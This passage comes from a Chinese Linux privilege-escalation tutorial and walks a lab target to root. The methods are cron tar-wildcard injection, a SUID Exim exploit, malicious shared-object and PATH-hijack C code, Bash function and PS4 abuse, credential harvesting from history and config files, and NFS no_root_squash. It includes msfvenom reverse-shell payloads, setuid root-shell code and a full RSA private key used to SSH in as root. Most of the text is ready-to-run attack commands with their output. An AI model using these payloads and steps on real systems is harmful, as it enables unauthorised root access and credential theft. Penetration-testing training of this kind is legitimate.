#!/bin/bash 
cp /bin/bash /tmp/rootbash 
chmod +s /tmp/rootbash
```

![image-20210630173757396](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-dd41b58a76f6df578d0932f574055e323eb0acde.png)

### 3.加权

```php
$ chmod +x /home/user/overwrite.sh
```

### 4.等待cronjob运行（此作业尤其每分钟运行一次）。

### 5.创建/tmp/rootbash文件

执行它，使用与-p保存有效的UID

```php
/tmp/rootbash –p
```

![image-20210630174309759](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-79cdf842084a1f17719bd76bd1b4c413212b05a7.png)

通配符
---

### 前言

当通配符字符 `*`作为参数的一部分提供给命令时，外壳将首先在通配符上执行 文件名扩展 （也称为 globbing）

此过程将用以空格分隔的文件列表替换通配符，以及当前目录中的目录名

执行命令：

```echo
echo *
```

### 通配符 &amp; 文件名

由于Linux 中的文件系统通常对文件名非常允许，并且文件名扩展在执行命令之前发生，因此可以通过创建具有这些名称的文件将命令行选项（例如 -h，-help）传递到命令

文件名不仅限于简单的选项  
事实上，我们可以创建匹配复杂选项的文件名：

```php
--option=key=value 
```

参考：<https://gtfobins.github.io>

可以帮助确定命令是否有有命令行选项

### 实操

#### 1.查看system-wide crontab内容:

```php
cat /etc/crontab 
```

![image-20210704104709412](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-15e80eb57967ff1866c41502789bb6a04f886e7a.png)

```php
root /usr/local/bin/compress.sh
```

#### 2.查看文件的内容：

```php
cat /usr/local/bin/compress.sh 
```

![image-20210704104806120](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-81f4a5ccc04b1712e6f020f06a059a3fd2ac3eb0.png)

注意：tar命令在 `/home/user`中使用通配符`*`运行

#### 3.查阅参考

显示tar具有命令行选项，可以用来运行其他命令作为检查点功能的一部分

#### 4.使用msfvenom创建反向壳ELF有效载荷：

```php
msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.175.161 LPORT=4444 -f elf -o shell.elf
```

![image-20210704110051360](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b27225596a549f4abdc201f82eb916a8462a44b7.png)

#### 5.搞文件到tar所在运行目录，并加权：

python开启HTTP服务

![image-20210704110127651](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-81f3b2db774350da0690a37b9139f3e635e28fe9.png)

![image-20210704110119309](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8de4131087638257b707090115a2b3abc4acc03f.png)

```php
chmod +x /home/user/shell.elf   
```

![image-20210704110200778](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fd8e099851738bc3cbef05b31c3b1f47167ad317.png)

#### 6.在/home/user目录中创建两个文件：

```php
touch /home/user/--checkpoint=1 

touch /home/user/--checkpoint-action=exec=shell.elf
```

![image-20210704110307745](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8d678382114971f0054fd57b4ae4efbf37c48f2f.png)

#### 7.kali运行nc等待cron job

0x09 SUID / SGID可执行文件
=====================

前言
--

SUID文件使用文件所有者的权限执行。  
SGID文件使用文件组的权限执行。  
如果文件归root所有，则使用root特权执行，我们也许能够使用它来升级权限。

SUID / SGID文件
-------------

我们可以使用以下`find`命令查找带有SUID 或 SGID 位集的文件

```php
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

![image-20210630180510655](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-83791431dd9db7071d75f9dfbda9c2471f430dd6.png)

外壳逃生序列
------

正如我们能够使用壳逃生序列与程序运行通过sudo，我们可以做同样的SUID/SGID文件。  
此处可以找到带有外壳逃生序列的程序列表 ：<https://gtfobins.github.io/>

注意：默认情况下， 环境变量LD\_PRELOAD &amp; LD\_LIBRARY\_PATH  
这是在Linux禁用，因为它带来的明显安全风险！  
**执行 SUID 文件时，这两个环境变量都会被忽略**

漏洞利用
----

某些程序安装 SUID 文件以帮助其操作。  
正如作为root运行的服务可能有漏洞，我们可以利用root外壳，这些SUID文件也可以。  
使用Searchsploit, Google, and GitHub可以找到漏洞

实操
--

### 1.在目标上查找SUID/SGID 文件 ：

```php
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null 
```

![image-20210630180804891](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b88fbc4f44c77f6ef5296c5be69247542fd78fbc.png)

```php
-rwsr-xr-x 1 root root 963691 May 13  2017 /usr/sbin/exim-4.84-3 
```

Exim 是一个邮件转账代理，但是它存在许多安全漏洞

### 2.版本确认：

```php
/usr/sbin/exim-4.84-3 --version 
```

![image-20210630181009415](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-05165101685f92cfc23ff1911f21c4d4e5c52a9e.png)

### 3.漏洞寻找

```php
searchsploit exim 4.84 
```

![image-20210630181114318](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-302ebb0dc672c6ed1fff2ca7f03746e63a3f7932.png)

这个：`linux/local/39535.sh`

### 4.漏洞利用(CVE-2016-1531)

脚本复制到目标机器上。您可能需要从脚本中删除^M字符：

```php
sed -e "s/^M//" 39535.sh > a001.sh
```

注意：要获得^M，必须按住Ctrl，然后连续按V和M。

### 5.加权

```php
chmod +x a001.sh
```

![image-20210704110724989](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3e9e0d7844708731bcb4009d3c5dd27b757b86f0.png)

### 6.执行脚本以获得根壳：

```php
./a001.sh 
```

![image-20210704110700833](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0a631ed1b6ebacb903c2969c1df70c4ab3779892.png)

共享对象注入
------

### 前言

执行程序时，它将尝试加载所需的共享对象。  
通过使用称为strace 的程序，我们可以跟踪这些系统呼叫并确定是否未找到任何共享对象。  
如果我们可以写信给程序尝试 打开的位置，我们可以创建一个共享对象，并在加载时生成root

### 实操

#### 1.在目标上查找SUID/SGID文件 ：

```php
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

![image-20210701115900118](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8b0551195dd68fdfbec04872b8ea3fbf1a7fe152.png)

```php
-rwsr-sr-x 1 root staff 9861 May 14  2017 /usr/local/bin/suid-so
```

`suid-so`文件在root用户权限下执行

#### 2.在SUID文件上运行分层：

```php
strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such  file"
```

![image-20210704111607655](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-080ed1e88284c005a2b1a72abb5f2b1c01b0b095.png)

```php
user@debian:~$ strace /usr/local/bin/suid-so 2>&1 | grep -iE "open|access|no such  file"
access("/etc/suid-debug", F_OK)         = -1 ENOENT (No such file or directory)
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
access("/etc/ld.so.preload", R_OK)      = -1 ENOENT (No such file or directory)
open("/etc/ld.so.cache", O_RDONLY)      = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libdl.so.2", O_RDONLY)       = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/usr/lib/libstdc++.so.6", O_RDONLY) = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libm.so.6", O_RDONLY)        = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libgcc_s.so.1", O_RDONLY)    = 3
access("/etc/ld.so.nohwcap", F_OK)      = -1 ENOENT (No such file or directory)
open("/lib/libc.so.6", O_RDONLY)        = 3
open("/home/user/.config/libcalc.so", O_RDONLY) = -1 ENOENT (No such file or directory)
user@debian:~$ 
```

可以看到找不到共享对象 `libcalc.so`，程序正在查看用户的家庭目录，我们可以写东西给这个目录

#### 3.创建 /home/user/.config目录

![image-20210704112350458](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-4eeff8a5aa98cecd74f9a3b8ee7d519ae5b167e7.png)

注意：这里查看的话 要查看隐藏文件夹命令

#### 4.创建`libcalc.c`具有 以下 内容：

```php
#include <stdio.h>
#include <stdlib.h>
static void inject() __attribute__((constructor));
void inject() {
setuid(0);
system("/bin/bash -p");
}
```

#### 5.进行编译

```php
gcc -shared -fPIC -o /home/user/.config/libcalc.so libcalc.c
```

![image-20210704112538615](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-29f3b05da32b2e4bce18be123687a00bdafadad2.png)

#### 6.运行可执行的SUID以获得根壳：

```php
 /usr/local/bin/suid-so
```

![image-20210704112616418](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-1e497e976e8b66964af1911ed396ed301c6e5cba.png)

路径环境变量
------

### 前言

PATH 环境变量包含外壳应尝试查找程序的目录列表。  
如果程序尝试执行其他程序，但只指定程序名称，而不是其完整（绝对）路径，则外壳将搜索 PATH 目录，直到找到为止。  
由于用户完全控制其 PATH 变量，我们可以告诉外壳首先在目录中查找我们可以写到的程序。

### 查找易受攻击的程序

如果程序尝试执行其他程序，该程序的名称可能嵌入到可执行文件中，作为string。  
我们可以在可执行文件上运行strings以查找strings。  
我们还可以使用策略(strace)来查看程序的执行情况。另一个称为"Itrace"的程序也可能有用。

#### 对文件运行字符串：

```php
strings /path/to/file   
```

#### 针对命令运行策略：

```php
strace -v -f -e execve <command> 2>&1 | grep exec
```

#### 对命令运行 跟踪 ：

```php
ltrace <command>
```

### 实操

#### 1.在目标上查找SUID/SGID文件 ：

```php
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null
```

![image-20210701171659145](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7f074f1fb2a18f87d4aabedd6a718806615be9fe.png)

```php
-rwsr-sr-x 1 root staff 6883 May 14  2017 /usr/local/bin/suid-env 
```

`suid-env`文件在root用户权限下执行

##### 2.在SUID文件上运行stings：

```php
strings /usr/local/bin/suid-env
```

![image-20210701173258438](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a7434c74adcdf0861df655cffb2d61e0756e3d1b.png)

该文件可能正在尝试在没有完整路径的情况下运行服务程序。

#### 3.我们可以用策略来验证这一点：

```php
strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
```

![image-20210701172526881](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ed5a227cfa97d6fb095755d91442f07d4eda7113.png)

```php
user@debian:~$ strace -v -f -e execve /usr/local/bin/suid-env 2>&1 | grep service
[pid  4721] execve("/bin/sh", ["sh", "-c", "service apache2 start"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=1", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"..., "_=/usr/bin/strace", "OLDPWD=/usr/local/bin"]) = 0
[pid  4721] execve("/usr/sbin/service", ["service", "apache2", "start"], ["SHELL=/bin/bash", "TERM=xterm-256color", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "USER=user", "HISTFILESIZE=1000000", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "PATH=/usr/local/bin:/usr/bin:/bi"..., "MAIL=/var/mail/user", "_=/usr/sbin/service", "PWD=/home/user", "LANG=en_US.UTF-8", "HOME=/home/user", "SHLVL=2", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"...]) = 0
[pid  4722] execve("/usr/bin/basename", ["basename", "/usr/sbin/service"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "_=/usr/bin/basename", "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=3", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"...]) = 0
[pid  4723] execve("/usr/bin/basename", ["basename", "/usr/sbin/service"], ["TERM=xterm-256color", "SHELL/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=3", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"..., "_=/usr/bin/basename"]) = 0
user@debian:~$ 
```

可选地，我们也可以用Itrace验证：

```php
ltrace /usr/local/bin/suid-env 2>&1 | grep service
```

![image-20210701172644492](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-8253f0f255bba9deeab526f166e113b6a4aa7b77.png)

这表明 系统 功能正用于执行 服务 计划。

#### 4.创建 service.c具有 以下 内容：

```php
int main() 
{ 
setuid(0); 
system("/bin/bash -p"); 
}
```

![image-20210701172832305](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e80ffa7172d24bfd91bae2afcf1756ed76f571f8.png)

#### 5.编译service.c文件：

```php
gcc -o service service.c
```

#### 6.将当前目录（或可执行新服务的位置）预编到PATH 变量，并执行用于根壳的 SUID 文件：

```php
PATH=.:$PATH /usr/local/bin/suid-env
```

![image-20210701172915956](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-055d4ac51aaff1c1b6aa2e86a4c6fe6a930b2074.png)

滥用外壳功能
------

### 前言

在某些外壳中(特别是 Bash &lt;4.2-048)，可以使用绝对路径名称定义用户功能。  
这些功能是可以导出，用来方便子处理程序能够访问它们，并且这些函数可以优先于实际可执行的呼叫。

### 实操

#### 1.在目标上查找SUID/SGID 文件 ：

```php
find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null 
```

![image-20210701173043064](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-0b180d7bd55e79a301e7d36bd8bd2e55043a74ff.png)

```php
-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2
```

`suid-env`文件在root权限下执行

#### 2.在SUID文件上运行字符串：

```php
strings /usr/local/bin/suid-env2 
```

![image-20210701173211516](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-39ace502b9e488e4b37d9a6d27d348267492c759.png)

该文件可能正在尝试运行 /usr/sbin/service

#### 3.我们可以用strace(策略)来验证这一点：

```php
strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
```

![image-20210701173504658](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-3cf0b547d24d1f43909286a9c8ac349b921faf01.png)

```php
user@debian:~$ strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
[pid  4892] execve("/bin/sh", ["sh", "-c", "/usr/sbin/service apache2 start"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "OLDPWD=/usr/local/bin", "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=1", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"..., "_=/usr/bin/strace"]) = 0
[pid  4892] execve("/usr/sbin/service", ["/usr/sbin/service", "apache2", "start"], ["SHELL=/bin/bash", "TERM=xterm-256color", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "USER=user", "HISTFILESIZE=1000000", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "PATH=/usr/local/bin:/usr/bin:/bi"..., "MAIL=/var/mail/user", "_=/usr/sbin/service", "PWD=/home/user", "LANG=en_US.UTF-8", "HOME=/home/user", "SHLVL=2", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"...]) = 0
[pid  4893] execve("/usr/bin/basename", ["basename", "/usr/sbin/service"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "_=/usr/bin/basename", "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=3", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"...]) = 0
[pid  4894] execve("/usr/bin/basename", ["basename", "/usr/sbin/service"], ["TERM=xterm-256color", "SHELL=/bin/bash", "HISTSIZE=1000000", "SSH_CLIaENT=192.168.175.130 41318"..., "SSH_TTY=/dev/pts/1", "HISTFILESIZE=1000000", "USER=user", "LS_COLORS=rs=0:di=01;34:ln=01;36"..., "MAIL=/var/mail/user", "PATH=/usr/local/bin:/usr/bin:/bi"..., "PWD=/home/user", "LANG=en_US.UTF-8", "SHLVL=3", "HOME=/home/user", "LOGNAME=user", "SSH_CONNECTION=192.168.175.130 4"..., "_=/usr/bin/basename"]) = 0a
```

#### 4.可选地，我们也可以用跟踪验证：

```php
ltrace /usr/local/bin/suid-env2 2>&1 | grep service 
```

![image-20210701173542883](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5350a08a51ce3cb9d840b80766090b44441cf135.png)

这表明system功能正在用于执行`/usr/sbin/service`计划

#### 5.验证 Bash 版本低于 4.2-048：

```php
bash --version 
```

![image-20210701173609992](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a21c4510c37f2ae3a10f4e4cb03982bd01ed03f7.png)

#### 6.创建 具有"/usr/sbin/service"名称的 Bash 功能 并导出 该功能：

```php
function /usr/sbin/service { /bin/bash -p; }
export –f /usr/sbin/service 
```

#### 7.执行用于根壳的 SUID 文件：

```php
/usr/local/bin/suid-env2 
root@debian:~# id 
uid=0(root) gid=0(root) groups=0(root) 
```

二、滥用外壳功能
--------

### 前言

Bash具有调试模式，可启用`–x`命令行选项，或通过修改 SHELLOPTS 环境变量以包括 xtrace启用。  
默认情况下，SHELLOPTS是只读的，但是env命令允许

外壳选择待设置  
在调试模式下，Bash 使用环境变量 PS4 显示调试语句的额外提示。此变量可以包括嵌入式命令，该命令每次显示时都会执行。

三、总线外壳功能

如果 SUID 文件通过 Bash 运行其他程序（例如使用system）， 这些环境变量可以继承。  
如果执行 SUID 文件，此命令将使用文件所有者的权限执行。  
在 Bash 版本 4.4 及以上中，PS4 环境变量不会由作为root运行的外壳继承。

### 实操

#### 1.在目标上查找苏伊德/SGID 文件 ：

```php
$ find / -type f -a \( -perm -u+s -o -perm -g+s \) -exec ls -l {} \; 2> /dev/null 

-rwsr-sr-x 1 root staff 6899 May 14  2017 /usr/local/bin/suid-env2 
```

这个`suid-env2` 文件在root用户权限下执行

#### 2.在SUID文件上运行字符串：

```php
$ strings /usr/local/bin/suid-env2 

/usr/sbin/service apache2 start
```

该文件可能正在尝试运行 `/usr/sbin/service`程序

#### 3.我们可以用策略来验证这一点：

```php
$ strace -v -f -e execve /usr/local/bin/suid-env2 2>&1 | grep service
```

#### 4.可选地，们也可以用Itrace验证：

```php
$ ltrace /usr/local/bin/suid-env 2>&1 | grep service
```

这和上一步操作都是一样的 下面开始

#### 5.运行支持bash调试的SUID文件，并分配给我们的有效载荷的PS4变量：

```php
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp/rootbash; chown root /tmp/rootbash; chmod +s /tmp/rootbash)' /usr/local/bin/suid-env2
```

![image-20210701173845361](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-72ab6042efd867c3589222ef44c2e0510faf2337.png)

#### 6.使用 -p 命令行选项运行 /tmp/rootbash文件以获取root：

```php
/tmp/rootbash -p
```

![image-20210701173901466](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-c3399be23d6f5a688ed79f87636e713cdf1a8a29.png)

0x10 密码 &amp;钥匙
===============

前言
--

### 密码

虽然这看起来可能很漫长，但弱密码存储和密码重复使用可能是升级权限的简单方法。

虽然root用户的帐户密码被隐藏起来，并安全地存储在`/etc/shadow`中

但其他密码（如用于服务的密码）可能会 以普通文本存储在配置文件中。

如果根用户将密码重新用于服务，则可能会找到该密码并用于切换到根用户。

### 历史文件

历史文件记录用户在使用某些程序时发出的命令。  
如果用户将密码键入命令的一部分，此密码可能会存储在历史记录文件中。  
尝试使用发现ed 密码切换到根

实操
--

### 1.查看用户/home目录中隐藏文件的内容，文件名以"历史记录"结尾：

```php
cat ~/.*history | less
```

![image-20210701180324981](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-56a27e2d5821bda8186a5f7cf05f6f88bfc97d40.png)

两次q退出来

似乎连接到MySQL服务器的用户

```php
root
password123
```

### 2.su 登录

![image-20210701180528720](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-ee2243ba9ab66d2302f0748077aa9614a8bb37b5.png)

配置文件
----

### 前言

许多服务和程序使用配置（配置）文件来存储设置。  
如果服务需要对某件内容进行身份验证，则可能会将凭据存储在配置文件中。  
如果这些配置文件是可访问的，并且它们存储的密码被特权用户重复使用，我们也许能够使用它作为该用户登录。

### 实操

#### 1.列出用户家庭目录的内容：

```php
ls
```

![image-20210701180706925](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-12939e314164ab4ea90bbdf0cfa7959afabda480.png)

#### 2.查看myvpn.ovpn 配置文件的内容：

```php
$ cat myvpn.ovpn 
```

![image-20210701180741245](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-007a319486092751f1bbe2ea3eebff4d2425a27e.png)

发现OpenVPN验证用户的纯文本内容

#### 3.查看文件内容：

```php
cat /etc/openvpn/auth.txt 
```

![image-20210701180850281](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-fd233229a943700cdfe892088c7794625c0737ab.png)

#### 4.使用su 登录

```php
su
```

![image-20210701180920818](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-e435de51356b82188ddbd124e7a1b3a53f63071a.png)

SSH 密钥
------

### 前言

可以使用 SSH 密钥而不是密码来验证使用 SSH 的用户。  
SSH密钥成对提供：一个私钥和一个公钥。私钥应始终保密。  
如果用户不安全地存储了其私钥，则任何能够读取密钥的用户都可能能够使用它登录到他们的帐户。

### 实操

#### 1.root用户的ssh密钥存储在`.ssh`

```php
ls -l /.ssh 
```

![image-20210701181023210](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5bec0d87fd30b1d2ca715253d9f0a258cad4d35c.png)

并且文件root\_key是可读的

#### 2.查看root\_key文件的内容：

```php
cat /.ssh/root_key
```

![image-20210701181321426](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-16a5debd2edc86c2cb15e9b1070e6f4f72cfdfca.png)

### 3.将root\_key文件复制到kali并加权以便 SSH 接受它：

注意格式问题

```php
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3IIf6Wczcdm38MZ9+QADSYq9FfKfwj0mJaUteyJHWHZ3/GNm
gLTH3Fov2Ss8QuGfvvD4CQ1f4N0PqnaJ2WJrKSP8QyxJ7YtRTk0JoTSGWTeUpExl
p4oSmTxYnO0LDcsezwNhBZn0kljtGu9p+dmmKbk40W4SWlTvU1LcEHRr6RgWMgQo
OHhxUFddFtYrknS4GiL5TJH6bt57xoIECnRc/8suZyWzgRzbo+TvDewK3ZhBN7HD
eV9G5JrjnVrDqSjhysUANmUTjUCTSsofUwlum+pU/dl9YCkXJRp7Hgy/QkFKpFET
Z36Z0g1JtQkwWxUD/iFj+iapkLuMaVT5dCq9kQIDAQABAoIBAQDDWdSDppYA6uz2
NiMsEULYSD0z0HqQTjQZbbhZOgkS6gFqa3VH2OCm6o8xSghdCB3Jvxk+i8bBI5bZ
YaLGH1boX6UArZ/g/mfNgpphYnMTXxYkaDo2ry/C6Z9nhukgEy78HvY5TCdL79Q+
5JNyccuvcxRPFcDUniJYIzQqr7laCgNU2R1lL87Qai6B6gJpyB9cP68rA02244el
WUXcZTk68p9dk2Q3tk3r/oYHf2LTkgPShXBEwP1VkF/2FFPvwi1JCCMUGS27avN7
VDFru8hDPCCmE3j4N9Sw6X/sSDR9ESg4+iNTsD2ziwGDYnizzY2e1+75zLyYZ4N7
6JoPCYFxAoGBAPi0ALpmNz17iFClfIqDrunUy8JT4aFxl0kQ5y9rKeFwNu50nTIW
1X+343539fKIcuPB0JY9ZkO9d4tp8M1Slebv/p4ITdKf43yTjClbd/FpyG2QNy3K
824ihKlQVDC9eYezWWs2pqZk/AqO2IHSlzL4v0T0GyzOsKJH6NGTvYhrAoGBAOL6
Wg07OXE08XsLJE+ujVPH4DQMqRz/G1vwztPkSmeqZ8/qsLW2bINLhndZdd1FaPzc
U7LXiuDNcl5u+Pihbv73rPNZOsixkklb5t3Jg1OcvvYcL6hMRwLL4iqG8YDBmlK1
Rg1CjY1csnqTOMJUVEHy0ofroEMLf/0uVRP3VsDzAoGBAIKFJSSt5Cu2GxIH51Zi
SXeaH906XF132aeU4V83ZGFVnN6EAMN6zE0c2p1So5bHGVSCMM/IJVVDp+tYi/GV
d+oc5YlWXlE9bAvC+3nw8P+XPoKRfwPfUOXp46lf6O8zYQZgj3r+0XLd6JA561Im
jQdJGEg9u81GI9jm2D60xHFFAoGAPFatRcMuvAeFAl6t4njWnSUPVwbelhTDIyfa
871GglRskHslSskaA7U6I9QmXxIqnL29ild+VdCHzM7XZNEVfrY8xdw8okmCR/ok
X2VIghuzMB3CFY1hez7T+tYwsTfGXKJP4wqEMsYntCoa9p4QYA+7I+LhkbEm7xk4
CLzB1T0CgYB2Ijb2DpcWlxjX08JRVi8+R7T2Fhh4L5FuykcDeZm1OvYeCML32EfN
Whp/Mr5B5GDmMHBRtKaiLS8/NRAokiibsCmMzQegmfipo+35DNTW66DDq47RFgR4
LnM9yXzn+CbIJGeJk5XUFQuLSv0f6uiaWNi7t9UNyayRmwejI6phSw==
-----END RSA PRIVATE KEY-----
```

```php
chmod 600 root_key
```

![image-20210701181516464](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-f5faa72d01320ca013c17cf1c3b6037ae4b8240b.png)

#### 4.使用密钥进行连接到 SSH 服务器

```php
ssh -i root_key root@192.168.175.228
```

![image-20210701181613497](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-7adec94327064619bded755864791886133f6449.png)

0x11 NFS
========

前言
--

NFS（网络文件系统）是一个流行的分布式文件系统。

NFS共享在`/etc/exports`文件中配置。  
远程用户可以安装共享、访问、创建、修改文件。  
默认情况下，创建的文件会继承remote用户的ID 和组ID(分别作为所有者和组)，即使它们不存在 NFS 服务器上。

显示 NFS 服务器的导出列表：
----------------

```php
showmount -e <target>
```

类似的nmap脚本：
----------

```php
nmap –sV –script=nfs-showmount <target>
```

安装 NFS 共享：
----------

```php
mount -o rw,vers=2 <target>:<share> <local_directory>
```

Root Squashing
--------------

Root Squashing是 NFS如何防止明显的特权升级。  
如果远程用户是(或声称是)root(uid=0)，NFS将改为"squash"用户，就好像他们是"nobody"用户一样，在"nogroup"组中。  
虽然此行为是默认的，但它可以禁用！

no\_root\_squash
----------------

`no_root_squash`是一个 NFS 配置选项，它关闭root的squash。  
当包含在可写入的共享配置中时，识别为"root"的远程用户可以作为本地根用户在 NFS 共享上创建文件。

实操
--

### 1.检查 /etc/exports 的内容，了解具有no\_root\_squash选项的配置：

```php
cat /etc/exports 
```

![image-20210701183617720](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-5e0949f7cb9b3737bec929c764eed7dd76215df3.png)

### 2.确认NFS 共享可用于远程安装：

```php
showmount -e 192.168.1.25 
```

![image-20210701183702574](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-48d607aebb1a35b6753388e479510775600ff806.png)

### 3.在kali上创建一个文件夹，并安装/tmp NFS共享：

```php
mkdir /tmp/nfs 

mount -o rw,vers=2 192.168.175.228:/tmp /tmp/nfs
```

![image-20210701183905563](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-27c5aef785f64f3d2804f13021199d2af9340dac.png)

### 4.使用kali上的root用户生成有效载荷并将其保存到安装的共享中：

```php
msfvenom -p linux/x86/exec CMD="/bin/bash -p" -f elf -o /tmp/nfs/shell.elf
```

![image-20210701184010960](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-a138fb44a890fcfd0b64c0c327c60270e31e985f.png)

### 5.确保文件具有 SUID 位集，并且每个用户都可执行：

```php
chmod +xs /tmp/nfs/shell.elf
```

![image-20210701184121840](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-2f4df8db8ce5609b60ae6ae6fe38dfb0dc3b6d50.png)

### 6.在目标机器上，执行文件以获取root：

```php
/tmp/shell.elf bash-4.1
```

![image-20210701184058216](https://shs3.b.qianxin.com/attack_forum/2021/12/attach-b2484c059a126bbf96507cdd6a4efe5a11c604b4.png)

权限提升总结
------

```php
1.信息收集(id, whoami)
2.运行Linux Smart Enumeration,并增加级别。
3.运行LinEnum和其他脚本
```

快速查找home中的文件 目录和其他公共位置(例如/var，/backup，/var/logs)

注意：如果用户有一个历史文件，它可能有 重要的信息，比如命令或者 密码

Sudo，Cron jobs，SUID文件

好好看看root进程，列举它们的版本，检查可以转发到的内部端口

最后考虑内核漏洞，进行提权

**最后请大家谨记网络安全法，遵纪守法，不要擅自做违法的事情，后果自负**  
